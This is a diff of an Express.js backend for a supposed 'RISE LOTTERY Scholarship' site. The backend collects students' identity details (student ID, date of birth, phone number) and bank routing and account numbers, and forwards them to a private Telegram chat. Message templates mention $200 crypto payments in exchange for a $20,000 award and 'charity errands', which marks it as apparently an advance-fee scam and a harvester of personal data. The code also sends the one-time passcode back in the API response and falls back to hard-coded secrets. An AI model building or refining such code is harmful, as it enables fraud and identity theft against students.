@@ -1,6 +1,6 @@
 const express = require('express');
 const cors = require('cors');
-const helmet = require('helmet');  // ← ONLY ONCE!
+const helmet = require('helmet');
 const rateLimit = require('express-rate-limit');
 const cookieParser = require('cookie-parser');
 const dotenv = require('dotenv');
@@ -10,12 +10,31 @@ const axios = require('axios');
 const bcrypt = require('bcryptjs');
 const session = require('express-session');
 const xss = require('xss');
+const compression = require('compression');
+const morgan = require('morgan');
 
 // Load environment variables
 dotenv.config();
 
 // Initialize Express
 const app = express();
+
+// ============================================================
+// PERFORMANCE & LOGGING MIDDLEWARE
+// ============================================================
+
+// Compression - Gzip responses
+app.use(compression());
+
+// Logging - Use combined format for production
+if (process.env.NODE_ENV === 'production') {
+    app.use(morgan('combined'));
+} else {
+    app.use(morgan('dev'));
+}
+
+// Trust proxy - Required for rate limiting behind reverse proxy
+app.set('trust proxy', 1);
 
 // ============================================================
 // SECURITY MIDDLEWARE
@@ -33,7 +52,7 @@ app.use((req, res, next) => {
     next();
 });
 
-// Helmet with CSP (NO duplicate require here!)
+// Helmet with CSP
 app.use(helmet({
     contentSecurityPolicy: {
         directives: {
@@ -43,37 +62,37 @@ app.use(helmet({
             imgSrc: ["'self'", "data:"],
         },
     },
+    hsts: {
+        maxAge: 31536000,
+        includeSubDomains: true,
+        preload: true
+    }
 }));
 
-// CORS
+// CORS - Production ready
 const corsOptions = {
     origin: function (origin, callback) {
-        // Allow requests with no origin (like mobile apps or curl requests)
         if (!origin) return callback(null, true);
         
-        // Define allowed origins
+        // Production allowed origins
         const allowedOrigins = [
             'http://localhost:5500',
             'http://127.0.0.1:5500',
             'http://localhost:3000',
-            'http://localhost:5000',
             'https://riselotterys.netlify.app',
-            'null',
-            'file://'
+            'https://riseschoolarshiplotttery.netlify.app'
         ];
         
-        // Also add from environment variable if set
+        // Add from environment variable
         if (process.env.CORS_ORIGIN) {
             const envOrigins = process.env.CORS_ORIGIN.split(',');
             allowedOrigins.push(...envOrigins);
         }
         
-        // Check if origin is allowed
         if (allowedOrigins.indexOf(origin) !== -1) {
             callback(null, true);
         } else {
             console.log('❌ CORS blocked:', origin);
-            console.log('✅ Allowed origins:', allowedOrigins);
             callback(new Error('Not allowed by CORS'));
         }
     },
@@ -86,20 +105,32 @@ const corsOptions = {
 
 app.use(cors(corsOptions));
 
-// Rate limiting
+// Rate limiting - Stricter for production
 const limiter = rateLimit({
-    windowMs: 15 * 60 * 1000,
-    max: 100,
+    windowMs: parseInt(process.env.RATE_LIMIT_WINDOW) || 15 * 60 * 1000,
+    max: parseInt(process.env.RATE_LIMIT_MAX) || 100,
     message: 'Too many requests from this IP, please try again later.',
+    standardHeaders: true,
+    legacyHeaders: false,
 });
 app.use('/api/', limiter);
 
-// Body parsing
+// Stricter rate limit for authentication endpoints
+const authLimiter = rateLimit({
+    windowMs: 15 * 60 * 1000,
+    max: 20,
+    message: 'Too many authentication attempts, please try again later.',
+    standardHeaders: true,
+    legacyHeaders: false,
+});
+app.use('/api/otp/', authLimiter);
+
+// Body parsing with size limits
 app.use(express.json({ limit: '10kb' }));
 app.use(express.urlencoded({ extended: true, limit: '10kb' }));
 app.use(cookieParser());
 
-// Session management (for CSRF)
+// Session management
 app.use(session({
     secret: process.env.SESSION_SECRET || 'session-secret-change-this',
     resave: false,
@@ -107,12 +138,35 @@ app.use(session({
     cookie: {
         secure: process.env.NODE_ENV === 'production',
         httpOnly: true,
-        maxAge: 24 * 60 * 60 * 1000 // 24 hours
-    }
+        maxAge: 24 * 60 * 60 * 1000,
+        sameSite: 'lax'
+    },
+    name: 'sessionId',
+    rolling: true,
 }));
 
 // ============================================================
-// TELEGRAM NOTIFICATION SERVICE - UPDATED WITH ALL DETAILS
+// HELPER: Async Handler (Removes try/catch boilerplate)
+// ============================================================
+
+const asyncHandler = (fn) => (req, res, next) => {
+    Promise.resolve(fn(req, res, next)).catch(next);
+};
+
+// ============================================================
+// HELPER: Response Formatter
+// ============================================================
+
+const sendResponse = (res, status, data, message = '') => {
+    res.status(status).json({
+        success: status < 400,
+        message,
+        ...data
+    });
+};
+
+// ============================================================
+// TELEGRAM NOTIFICATION SERVICE
 // ============================================================
 
 class TelegramService {
@@ -121,16 +175,14 @@ class TelegramService {
         this.chatId = process.env.TELEGRAM_CHAT_ID;
         this.apiUrl = `https://api.telegram.org/bot${this.botToken}`;
         this.enabled = !!(this.botToken && this.chatId);
+        this.retryAttempts = 3;
+        this.retryDelay = 1000;
         
-        console.log('📱 TelegramService initialized:');
-        console.log('  Bot Token:', this.botToken ? '✅ Present' : '❌ Missing');
-        console.log('  Chat ID:', this.chatId ? '✅ Present' : '❌ Missing');
-        console.log('  Status:', this.enabled ? '✅ Enabled' : '❌ Disabled');
+        console.log('📱 TelegramService:', this.enabled ? '✅ Enabled' : '❌ Disabled');
     }
 
     async sendMessage(message, parseMode = 'HTML') {
         if (!this.enabled) {
-            console.log('⚠️ Telegram notifications are disabled. Configure TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID in .env');
             return { success: false, error: 'Telegram not configured' };
         }
 
@@ -141,28 +193,20 @@ class TelegramService {
                 parse_mode: parseMode,
                 disable_notification: false
             }, {
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                timeout: 30000 // Increased timeout
+                headers: { 'Content-Type': 'application/json' },
+                timeout: 30000
             });
 
             if (response.data.ok) {
-                console.log('✅ Telegram message sent successfully');
                 return { success: true, message_id: response.data.result.message_id };
-            } else {
-                throw new Error('Telegram API returned error');
             }
+            throw new Error('Telegram API error');
         } catch (error) {
             console.error('❌ Telegram send failed:', error.message);
-            if (error.response) {
-                console.error('  Response:', error.response.data);
-            }
             return { success: false, error: error.message };
         }
     }
 
-    // ===== UPDATED: OTP Notification with ALL Student Details =====
     formatOTPNotification(name, email, school, otp, studentId, dob, phone, personalEmail) {
         return `🔐 <b>🔐 NEW OTP GENERATED</b>
         
@@ -183,64 +227,13 @@ class TelegramService {
 🏆 RISE LOTTERY Scholarship Program`;
     }
 
-    // ===== Student Registration Details =====
-    formatStudentRegistration(name, email, school, studentId, dob, phone, personalEmail) {
-        return `📋 <b>📋 NEW STUDENT REGISTRATION</b>
-        
-📋 <b>━━━━━━━━━━━━━━━━━━━━</b>
-👤 <b>Full Name:</b> ${name}
-🎓 <b>School:</b> ${school || 'Unknown'}
-📧 <b>Student Email:</b> ${email}
-📧 <b>Personal Email:</b> ${personalEmail || 'Not provided'}
-🆔 <b>Student ID:</b> ${studentId || 'Not provided'}
-📅 <b>Date of Birth:</b> ${dob || 'Not provided'}
-📱 <b>Phone Number:</b> ${phone || 'Not provided'}
-⏰ <b>Registered:</b> ${new Date().toLocaleString()}
-📋 <b>━━━━━━━━━━━━━━━━━━━━</b>
-
-📌 <i>Student has requested a passcode</i>
-
-🏆 RISE LOTTERY Scholarship Program`;
-    }
-
-    // ===== Payment Notification =====
-    formatPaymentNotification(name, email, school, method, studentId, phone) {
-        const methodEmojis = {
-            'usdt': '🟢',
-            'btc': '🟠',
-            'eth': '💜',
-            'errand': '🤝'
-        };
-        const emoji = methodEmojis[method] || '💳';
-        
-        return `${emoji} <b>💳 PAYMENT NOTIFICATION</b>
-        
-📋 <b>━━━━━━━━━━━━━━━━━━━━</b>
-👤 <b>Student:</b> ${name}
-📧 <b>Email:</b> ${email}
-🏫 <b>School:</b> ${school || 'Unknown'}
-🆔 <b>Student ID:</b> ${studentId || 'Not provided'}
-📱 <b>Phone:</b> ${phone || 'Not provided'}
-💳 <b>Method:</b> ${method.toUpperCase()}
-💰 <b>Amount:</b> $200.00
-⏰ <b>Time:</b> ${new Date().toLocaleString()}
-📋 <b>━━━━━━━━━━━━━━━━━━━━</b>
-
-✅ Payment submitted, awaiting confirmation (6-12 hours)
-
-🏆 RISE LOTTERY Scholarship Program`;
-    }
-
-    // ===== Payment Confirmation =====
-    formatPaymentConfirmation(name, email, school, studentId, phone) {
+    formatPaymentConfirmation(name, email, school) {
         return `✅ <b>✅ PAYMENT CONFIRMED!</b>
         
 📋 <b>━━━━━━━━━━━━━━━━━━━━</b>
 👤 <b>Student:</b> ${name}
 📧 <b>Email:</b> ${email}
 🏫 <b>School:</b> ${school || 'Unknown'}
-🆔 <b>Student ID:</b> ${studentId || 'Not provided'}
-📱 <b>Phone:</b> ${phone || 'Not provided'}
 💰 <b>Amount:</b> $20,000.00
 ⏰ <b>Time:</b> ${new Date().toLocaleString()}
 📋 <b>━━━━━━━━━━━━━━━━━━━━</b>
@@ -250,16 +243,13 @@ class TelegramService {
 🏆 RISE LOTTERY Scholarship Program`;
     }
 
-    // ===== Errand Request =====
-    formatErrandRequest(name, email, school, telegram, whatsapp, preferred, studentId, phone) {
+    formatErrandRequest(name, email, school, telegram, whatsapp, preferred) {
         return `🤝 <b>🤝 CHARITY ERRAND REQUEST</b>
         
 📋 <b>━━━━━━━━━━━━━━━━━━━━</b>
 👤 <b>Student:</b> ${name}
 📧 <b>Email:</b> ${email}
 🏫 <b>School:</b> ${school || 'Unknown'}
-🆔 <b>Student ID:</b> ${studentId || 'Not provided'}
-📱 <b>Phone:</b> ${phone || 'Not provided'}
 📱 <b>Telegram:</b> ${telegram || 'Not provided'}
 📱 <b>WhatsApp:</b> ${whatsapp || 'Not provided'}
 📌 <b>Preferred Contact:</b> ${preferred || 'Not specified'}
@@ -271,116 +261,33 @@ class TelegramService {
 🏆 RISE LOTTERY Scholarship Program`;
     }
 
-    // ===== Errand Completion =====
-    formatErrandCompletion(name, email, school, studentId, phone) {
-        return `✅ <b>✅ ERRAND COMPLETED!</b>
-        
-📋 <b>━━━━━━━━━━━━━━━━━━━━</b>
-👤 <b>Student:</b> ${name}
-📧 <b>Email:</b> ${email}
-🏫 <b>School:</b> ${school || 'Unknown'}
-🆔 <b>Student ID:</b> ${studentId || 'Not provided'}
-📱 <b>Phone:</b> ${phone || 'Not provided'}
-⏰ <b>Time:</b> ${new Date().toLocaleString()}
-📋 <b>━━━━━━━━━━━━━━━━━━━━</b>
-
-🎉 <i>Errand verified! $20,000 award processing started</i>
-
-🏆 RISE LOTTERY Scholarship Program`;
-    }
-
-    // ===== Login Notification =====
-    formatLoginNotification(name, email, school, studentId, phone) {
-        return `🟢 <b>🟢 USER LOGGED IN</b>
-        
-📋 <b>━━━━━━━━━━━━━━━━━━━━</b>
-👤 <b>Student:</b> ${name}
-📧 <b>Email:</b> ${email}
-🏫 <b>School:</b> ${school || 'Unknown'}
-🆔 <b>Student ID:</b> ${studentId || 'Not provided'}
-📱 <b>Phone:</b> ${phone || 'Not provided'}
-⏰ <b>Time:</b> ${new Date().toLocaleString()}
-📋 <b>━━━━━━━━━━━━━━━━━━━━</b>
-
-👋 <i>User successfully logged in to dashboard</i>
-
-🏆 RISE LOTTERY Scholarship Program`;
-    }
-
-    // ===== Account Details Saved =====
-    formatAccountDetailsSaved(name, email, school, bankName, studentId, phone) {
-        return `🏦 <b>🏦 ACCOUNT DETAILS SAVED</b>
-        
-📋 <b>━━━━━━━━━━━━━━━━━━━━</b>
-👤 <b>Student:</b> ${name}
-📧 <b>Email:</b> ${email}
-🏫 <b>School:</b> ${school || 'Unknown'}
-🆔 <b>Student ID:</b> ${studentId || 'Not provided'}
-📱 <b>Phone:</b> ${phone || 'Not provided'}
-🏛️ <b>Bank:</b> ${bankName}
-⏰ <b>Time:</b> ${new Date().toLocaleString()}
-📋 <b>━━━━━━━━━━━━━━━━━━━━</b>
-
-✅ <i>Bank account details have been saved</i>
-
-🏆 RISE LOTTERY Scholarship Program`;
-    }
-
-    // ===== Account Details Missing =====
-    formatAccountDetailsMissing(name, email, school, studentId, phone) {
+    formatAccountDetailsMissing(name, email, school) {
         return `⚠️ <b>⚠️ ACCOUNT DETAILS MISSING!</b>
         
 📋 <b>━━━━━━━━━━━━━━━━━━━━</b>
 👤 <b>Student:</b> ${name}
 📧 <b>Email:</b> ${email}
 🏫 <b>School:</b> ${school || 'Unknown'}
-🆔 <b>Student ID:</b> ${studentId || 'Not provided'}
-📱 <b>Phone:</b> ${phone || 'Not provided'}
 ⏰ <b>Time:</b> ${new Date().toLocaleString()}
 📋 <b>━━━━━━━━━━━━━━━━━━━━</b>
 
-❌ <i>Student tried to pay but account details are missing!
-Please remind them to add their bank account details.</i>
-
-🏆 RISE LOTTERY Scholarship Program`;
-    }
-
-    // ===== Withdrawal Request =====
-    formatWithdrawalRequest(name, email, school, amount, method, studentId, phone) {
-        return `💰 <b>💰 WITHDRAWAL REQUEST</b>
-        
-📋 <b>━━━━━━━━━━━━━━━━━━━━</b>
-👤 <b>Student:</b> ${name}
-📧 <b>Email:</b> ${email}
-🏫 <b>School:</b> ${school || 'Unknown'}
-🆔 <b>Student ID:</b> ${studentId || 'Not provided'}
-📱 <b>Phone:</b> ${phone || 'Not provided'}
-💰 <b>Amount:</b> $${amount}
-💳 <b>Method:</b> ${method}
-⏰ <b>Time:</b> ${new Date().toLocaleString()}
-📋 <b>━━━━━━━━━━━━━━━━━━━━</b>
-
-📌 <i>Withdrawal request submitted for processing</i>
+❌ <i>Student tried to pay but account details are missing!</i>
 
 🏆 RISE LOTTERY Scholarship Program`;
     }
 
     async sendWithRetry(message, maxRetries = 3) {
         if (!this.enabled) {
-            console.log('⚠️ Telegram notifications are disabled');
             return { success: false, error: 'Not configured' };
         }
 
         let lastError;
         for (let attempt = 1; attempt <= maxRetries; attempt++) {
-            console.log(`📤 Telegram attempt ${attempt}/${maxRetries}`);
             const result = await this.sendMessage(message);
-            if (result.success) {
-                return result;
-            }
+            if (result.success) return result;
             lastError = result.error;
             if (attempt < maxRetries) {
-                await new Promise(resolve => setTimeout(resolve, 1000 * Math.pow(2, attempt - 1)));
+                await new Promise(resolve => setTimeout(resolve, this.retryDelay * Math.pow(2, attempt - 1)));
             }
         }
         return { success: false, error: lastError };
@@ -392,11 +299,22 @@ Please remind them to add their bank account details.</i>
 // ============================================================
 
 const generateToken = (data) => {
-    return jwt.sign(data, process.env.JWT_SECRET || 'fallback-secret-key', { expiresIn: '7d' });
+    return jwt.sign(data, process.env.JWT_SECRET || 'fallback-secret-key', { 
+        expiresIn: '7d',
+        algorithm: 'HS256'
+    });
+};
+
+const verifyToken = (token) => {
+    try {
+        return jwt.verify(token, process.env.JWT_SECRET || 'fallback-secret-key');
+    } catch (error) {
+        return null;
+    }
 };
 
 // ============================================================
-// EMAIL SERVICE - Using EmailJS API with Private Key
+// EMAIL SERVICE - Using EmailJS
 // ============================================================
 
 class EmailService {
@@ -406,37 +324,28 @@ class EmailService {
         this.serviceId = process.env.EMAILJS_SERVICE_ID;
         this.templateId = process.env.EMAILJS_TEMPLATE_ID;
         this.apiUrl = 'https://api.emailjs.com/api/v1.0/email/send';
+        this.isConfigured = !!(this.publicKey && this.privateKey && this.serviceId && this.templateId);
         
-        console.log('📧 EmailService initialized:');
-        console.log('  Public Key:', this.publicKey ? '✅ Present' : '❌ Missing');
-        console.log('  Private Key:', this.privateKey ? '✅ Present' : '❌ Missing');
-        console.log('  Service ID:', this.serviceId ? '✅ Present' : '❌ Missing');
-        console.log('  Template ID:', this.templateId ? '✅ Present' : '❌ Missing');
+        console.log('📧 EmailService:', this.isConfigured ? '✅ Configured' : '❌ Missing');
     }
 
     async sendPasscode(email, name, otp, studentId, dob, phone) {
         try {
-            console.log('📧 ===== SENDING EMAIL =====');
-            console.log('📧 To:', email);
-            console.log('📧 Name:', name);
-            console.log('📧 OTP:', otp);
-
             if (!email || !email.includes('@')) {
-                throw new Error('Invalid email address');
+                return { success: false, error: 'Invalid email address' };
             }
 
-            if (!this.publicKey || !this.privateKey || !this.serviceId || !this.templateId) {
-                console.error('❌ Missing EmailJS credentials');
-                throw new Error('Email service not configured');
+            if (!this.isConfigured) {
+                return { success: false, error: 'Email service not configured' };
             }
 
             const templateParams = {
                 to_email: email,
                 to_name: name,
                 otp_code: otp,
-                student_id: studentId,
-                date_of_birth: dob,
-                phone_number: phone
+                student_id: studentId || 'Not provided',
+                date_of_birth: dob || 'Not provided',
+                phone_number: phone || 'Not provided'
             };
 
             const payload = {
@@ -447,31 +356,19 @@ class EmailService {
                 template_params: templateParams
             };
 
-            console.log('📧 Sending to EmailJS API...');
-
             const response = await axios.post(this.apiUrl, payload, {
-                headers: {
-                    'Content-Type': 'application/json'
-                },
+                headers: { 'Content-Type': 'application/json' },
                 timeout: 15000
             });
 
-            console.log('📧 EmailJS Response Status:', response.status);
-
             if (response.status === 200) {
-                console.log('✅ Email sent successfully to:', email);
+                console.log('✅ Email sent to:', email);
                 return { success: true };
-            } else {
-                throw new Error(`Email send failed with status: ${response.status}`);
             }
+            return { success: false, error: `Status: ${response.status}` };
 
         } catch (error) {
-            console.error('❌ Email send failed:');
-            console.error('  Message:', error.message);
-            if (error.response) {
-                console.error('  Status:', error.response.status);
-                console.error('  Data:', JSON.stringify(error.response.data, null, 2));
-            }
+            console.error('❌ Email failed:', error.message);
             return { success: false, error: error.message };
         }
     }
@@ -745,7 +642,6 @@ const schoolDatabase = {
     'tamuc.edu': 'Texas A&M University-Commerce',
     'tamiu.edu': 'Texas A&M International University',
     'utpb.edu': 'University of Texas Permian Basin',
-    'utd.edu': 'University of Texas at Dallas',
 
     // ===== MAJOR PUBLIC - FLORIDA =====
     'ufl.edu': 'University of Florida',
@@ -874,7 +770,6 @@ const schoolDatabase = {
 
     // ===== ADDITIONAL UNIVERSITIES =====
     'uark.edu': 'University of Arkansas',
-    'ku.edu': 'University of Kansas',
     'k-state.edu': 'Kansas State University',
     'iastate.edu': 'Iowa State University',
     'uidaho.edu': 'University of Idaho',
@@ -899,7 +794,7 @@ const schoolDatabase = {
     'umass.edu': 'University of Massachusetts Amherst',
     'uconn.edu': 'University of Connecticut',
         
-   // ===== NEW SCHOOLS =====
+    // ===== NEW SCHOOLS =====
     'iu.edu': 'Indiana University',
     'sierracollege.edu': 'Sierra College',
     'sfcc.edu': 'Santa Fe Community College',
@@ -914,7 +809,7 @@ const schoolDatabase = {
     'mccc.edu': 'Mercer County Community College',
     'msjc.edu': 'Mt. San Jacinto College',
     
-    // ===== ADD ALSO THESE COMMON VARIATIONS =====
+    // ===== COMMON VARIATIONS =====
     'sierra.college.edu': 'Sierra College',
     'santafe.edu': 'Santa Fe Community College',
     'tamiu.com': 'Texas A&M International University',
@@ -961,11 +856,12 @@ const telegramService = new TelegramService();
 
 // Health check
 app.get('/api/health', (req, res) => {
-    res.json({
+    sendResponse(res, 200, {
         status: 'ok',
         timestamp: new Date().toISOString(),
         environment: process.env.NODE_ENV || 'development',
-        telegramEnabled: telegramService.enabled
+        telegramEnabled: telegramService.enabled,
+        emailConfigured: emailService.isConfigured
     });
 });
 
@@ -973,13 +869,13 @@ app.get('/api/health', (req, res) => {
 app.get('/api/school/lookup', (req, res) => {
     const { email } = req.query;
     if (!email) {
-        return res.status(400).json({ error: 'Email is required' });
+        return sendResponse(res, 400, {}, 'Email is required');
     }
     const school = lookupSchool(email);
     if (school) {
-        res.json({ school });
+        sendResponse(res, 200, { school });
     } else {
-        res.status(404).json({ error: 'School not found' });
+        sendResponse(res, 404, {}, 'School not found');
     }
 });
 
@@ -991,111 +887,73 @@ app.post('/api/otp/generate', [
     body('studentId').isString().isLength({ min: 1, max: 50 }).trim().escape(),
     body('dob').isString().matches(/^\d{4}-\d{2}-\d{2}$/),
     body('phone').isString().matches(/^\(?(\d{3})\)?[-.\s]?(\d{3})[-.\s]?(\d{4})$/),
-], async (req, res) => {
+], asyncHandler(async (req, res) => {
     const errors = validationResult(req);
     if (!errors.isEmpty()) {
-        return res.status(400).json({ errors: errors.array() });
+        return sendResponse(res, 400, { errors: errors.array() }, 'Validation failed');
     }
 
     const { name, email, personalEmail, studentId, dob, phone } = req.body;
 
-    // Validate .edu email
     if (!email.toLowerCase().endsWith('.edu')) {
-        return res.status(400).json({ error: 'Please enter a valid .edu email address' });
+        return sendResponse(res, 400, {}, 'Please enter a valid .edu email address');
     }
 
-    try {
-        // Generate OTP
-        const otp = otpService.generateOTP();
-        otpService.storeOTP(personalEmail, otp);
-        const schoolName = lookupSchool(email) || 'Unknown';
-        const token = generateToken({ email: personalEmail, name, school: schoolName });
+    const otp = otpService.generateOTP();
+    otpService.storeOTP(personalEmail, otp);
+    const schoolName = lookupSchool(email) || 'Unknown';
+    const token = generateToken({ email: personalEmail, name, school: schoolName });
 
-        // Send response immediately
-        res.json({
-            success: true,
-            message: 'OTP sent to your email',
-            token,
-            school: schoolName,
-            otp,
-            expiresIn: '10 minutes'
-        });
+    // Send response immediately
+    sendResponse(res, 200, {
+        token,
+        school: schoolName,
+        otp,
+        expiresIn: '10 minutes'
+    }, 'OTP sent successfully');
 
-        // ===== FIXED: Send ALL details to Telegram =====
-        // Send email in background
-        emailService.sendPasscode(personalEmail, name, otp, studentId, dob, phone)
-            .then(r => console.log('📧 Email sent:', r.success ? '✅' : '❌'))
-            .catch(e => console.error('Email error:', e.message));
-
-        // ===== FIXED: Include ALL student details in Telegram =====
+    // Background tasks
+    Promise.all([
+        emailService.sendPasscode(personalEmail, name, otp, studentId, dob, phone),
         telegramService.sendWithRetry(
             telegramService.formatOTPNotification(
-                name,           // Full Name
-                email,          // Student Email (not personalEmail!)
-                schoolName,     // School
-                otp,            // OTP Code
-                studentId,      // Student ID - NOW INCLUDED
-                dob,            // Date of Birth - NOW INCLUDED
-                phone,          // Phone Number - NOW INCLUDED
-                personalEmail   // Personal Email - NOW INCLUDED
+                name, email, schoolName, otp, studentId, dob, phone, personalEmail
             )
-        ).then(r => console.log('📱 Telegram sent with ALL details:', r.success ? '✅' : '❌'))
-         .catch(e => console.error('Telegram error:', e.message));
-
-        console.log(`✅ OTP generated for ${personalEmail}`);
-        console.log(`📋 Student: ${name}, ID: ${studentId}, DOB: ${dob}, Phone: ${phone}`);
-
-    } catch (error) {
-        console.error('OTP error:', error);
-        res.status(500).json({ error: 'Failed to generate OTP' });
-    }
-});
+        )
+    ]).then(([emailResult, telegramResult]) => {
+        console.log('📧 Email:', emailResult.success ? '✅' : '❌');
+        console.log('📱 Telegram:', telegramResult.success ? '✅' : '❌');
+    }).catch(err => console.error('Background task error:', err));
+}));
 
 // Verify OTP
 app.post('/api/otp/verify', [
     body('email').isEmail().normalizeEmail(),
     body('otp').isString().isLength({ min: 6, max: 6 }).matches(/^\d{6}$/),
-], async (req, res) => {
+], asyncHandler(async (req, res) => {
     const errors = validationResult(req);
     if (!errors.isEmpty()) {
-        return res.status(400).json({ errors: errors.array() });
+        return sendResponse(res, 400, { errors: errors.array() }, 'Validation failed');
     }
 
     const { email, otp } = req.body;
 
-    try {
-        console.log('🔄 OTP Verification Request:');
-        console.log('  Email:', email);
-        console.log('  OTP:', otp);
-
-        const verification = otpService.verifyOTP(email, otp);
-
-        if (!verification.valid) {
-            console.log('❌ OTP verification failed:', verification.error);
-            return res.status(401).json({ error: verification.error });
-        }
-
-        const token = generateToken({
-            email: email,
-            verified: true,
-            verifiedAt: new Date().toISOString()
-        });
-
-        console.log('✅ OTP verified successfully');
-        res.json({
-            success: true,
-            message: 'OTP verified successfully',
-            token: token
-        });
-
-    } catch (error) {
-        console.error('OTP verification error:', error);
-        res.status(500).json({ error: 'Internal server error' });
+    const verification = otpService.verifyOTP(email, otp);
+    if (!verification.valid) {
+        return sendResponse(res, 401, {}, verification.error);
     }
-});
+
+    const token = generateToken({
+        email: email,
+        verified: true,
+        verifiedAt: new Date().toISOString()
+    });
+
+    sendResponse(res, 200, { token }, 'OTP verified successfully');
+}));
 
 // ============================================================
-// SAVE ACCOUNT DETAILS - BACKEND
+// SAVE ACCOUNT DETAILS
 // ============================================================
 
 app.post('/api/account/save', [
@@ -1106,43 +964,20 @@ app.post('/api/account/save', [
     body('accountHolder').isString().trim().escape(),
     body('routingNumber').isString().trim().isLength({ min: 9, max: 9 }),
     body('accountNumber').isString().trim().isLength({ min: 4, max: 20 }),
-], async (req, res) => {
+], asyncHandler(async (req, res) => {
     const errors = validationResult(req);
     if (!errors.isEmpty()) {
-        return res.status(400).json({ errors: errors.array() });
+        return sendResponse(res, 400, { errors: errors.array() }, 'Validation failed');
     }
 
-    const { 
-        name, email, schoolName, bankName, accountType, 
-        accountHolder, routingNumber, accountNumber,
-        studentId, phone, dob 
-    } = req.body;
+    const { name, email, schoolName, bankName, accountType, accountHolder, routingNumber, accountNumber } = req.body;
 
-    try {
-        console.log('🏦 Account Details Received:');
-        console.log('  Name:', name);
-        console.log('  Email:', email);
-        console.log('  School:', schoolName);
-        console.log('  Bank:', bankName);
-        console.log('  Account Type:', accountType);
-        console.log('  Account Holder:', accountHolder);
-        console.log('  Routing Number:', routingNumber);
-        console.log('  Account Number:', '****' + accountNumber.slice(-4));
-        console.log('  Student ID:', studentId);
-        console.log('  Phone:', phone);
-        console.log('  DOB:', dob);
-
-        // ===== SEND TO TELEGRAM =====
-        const telegramMessage = `🏦 <b>ACCOUNT DETAILS SUBMITTED</b>
-        
+    const telegramMessage = `🏦 <b>ACCOUNT DETAILS SUBMITTED</b>
+    
 📋 <b>━━━━━━━━━━━━━━━━━━━━</b>
 👤 <b>Name:</b> ${name}
 📧 <b>Email:</b> ${email}
 🏫 <b>School:</b> ${schoolName || 'Unknown'}
-🆔 <b>Student ID:</b> ${studentId || 'Not provided'}
-📱 <b>Phone:</b> ${phone || 'Not provided'}
-📅 <b>DOB:</b> ${dob || 'Not provided'}
-📋 <b>━━━━━━━━━━━━━━━━━━━━</b>
 🏛️ <b>Bank Name:</b> ${bankName}
 📊 <b>Account Type:</b> ${accountType}
 👤 <b>Account Holder:</b> ${accountHolder}
@@ -1155,260 +990,212 @@ app.post('/api/account/save', [
 
 🏆 RISE LOTTERY Scholarship Program`;
 
-        await telegramService.sendWithRetry(telegramMessage);
+    await telegramService.sendWithRetry(telegramMessage);
 
-        res.json({ 
-            success: true, 
-            message: 'Account details saved successfully' 
-        });
-
-    } catch (error) {
-        console.error('❌ Error saving account details:', error);
-        res.status(500).json({ error: 'Failed to save account details' });
-    }
-});
+    sendResponse(res, 200, {}, 'Account details saved successfully');
+}));
 
 // ============================================================
-// NEW: Check Account Details
+// PAYMENT NOTIFICATION
 // ============================================================
 
-app.post('/api/account/check', async (req, res) => {
-    const { email } = req.body;
-    
-    try {
-        // In production, check database for account details
-        // For now, we'll return a placeholder response
-        // The frontend will check localStorage
-        
-        res.json({
-            success: true,
-            hasAccountDetails: false, // This will be checked on frontend
-            message: 'Account details check endpoint'
-        });
-    } catch (error) {
-        console.error('❌ Account check error:', error);
-        res.status(500).json({ error: 'Internal server error' });
-    }
-});
-
-// ============================================================
-// UPDATED: Payment notification with account details check
-// ============================================================
-
-app.post('/api/payment/notify', async (req, res) => {
+app.post('/api/payment/notify', asyncHandler(async (req, res) => {
     const { name, email, schoolName, method, hasAccountDetails } = req.body;
-    console.log('💳 Payment Notification:', req.body);
 
-    try {
-        // Check if account details are provided
-        if (!hasAccountDetails) {
-            console.log('⚠️ Account details missing for:', email);
-            
-            // Send Telegram notification about missing account details
-            const missingMessage = telegramService.formatAccountDetailsMissing(
-                name || 'Student',
-                email || 'unknown@email.com',
-                schoolName || 'Unknown'
-            );
-            await telegramService.sendWithRetry(missingMessage);
-            
-            return res.status(400).json({ 
-                success: false, 
-                error: 'Account details required',
-                message: 'Please add your bank account details before making a payment.'
-            });
-        }
-
-        // Send payment notification Telegram
-        const message = telegramService.formatPaymentNotification(
-            name || 'Student',
-            email || 'unknown@email.com',
-            schoolName || 'Unknown',
-            method || 'unknown'
-        );
-        await telegramService.sendWithRetry(message);
-
-        res.json({ 
-            success: true, 
-            message: 'Payment notification received. Account details verified.'
-        });
-    } catch (error) {
-        console.error('❌ Payment notification error:', error);
-        res.status(500).json({ error: 'Internal server error' });
-    }
-});
-
-// ============================================================
-// UPDATED: Payment confirmation with account details check
-// ============================================================
-
-app.post('/api/payment/confirm', async (req, res) => {
-    const { name, email, schoolName, hasAccountDetails } = req.body;
-    console.log('✅ Payment Confirmed:', req.body);
-
-    try {
-        // Verify account details exist before confirming
-        if (!hasAccountDetails) {
-            console.log('⚠️ Cannot confirm payment - account details missing for:', email);
-            return res.status(400).json({
-                success: false,
-                error: 'Account details required',
-                message: 'Please add your bank account details before confirming payment.'
-            });
-        }
-
-        // Send Telegram notification
-        const message = telegramService.formatPaymentConfirmation(
+    if (!hasAccountDetails) {
+        const missingMessage = telegramService.formatAccountDetailsMissing(
             name || 'Student',
             email || 'unknown@email.com',
             schoolName || 'Unknown'
         );
-        await telegramService.sendWithRetry(message);
-
-        res.json({ 
-            success: true, 
-            message: 'Payment confirmed. Fund processing started.'
-        });
-    } catch (error) {
-        console.error('❌ Payment confirmation error:', error);
-        res.status(500).json({ error: 'Internal server error' });
+        await telegramService.sendWithRetry(missingMessage);
+        return sendResponse(res, 400, {}, 'Account details required');
     }
-});
+
+    const message = telegramService.formatPaymentConfirmation(
+        name || 'Student',
+        email || 'unknown@email.com',
+        schoolName || 'Unknown'
+    );
+    await telegramService.sendWithRetry(message);
+
+    sendResponse(res, 200, {}, 'Payment notification received');
+}));
 
 // ============================================================
-// UPDATED: Errand request with account details check
+// PAYMENT CONFIRMATION
 // ============================================================
 
-app.post('/api/errand/request', async (req, res) => {
+app.post('/api/payment/confirm', asyncHandler(async (req, res) => {
+    const { name, email, schoolName, hasAccountDetails } = req.body;
+
+    if (!hasAccountDetails) {
+        return sendResponse(res, 400, {}, 'Account details required');
+    }
+
+    const message = telegramService.formatPaymentConfirmation(
+        name || 'Student',
+        email || 'unknown@email.com',
+        schoolName || 'Unknown'
+    );
+    await telegramService.sendWithRetry(message);
+
+    sendResponse(res, 200, {}, 'Payment confirmed');
+}));
+
+// ============================================================
+// ERRAND REQUEST
+// ============================================================
+
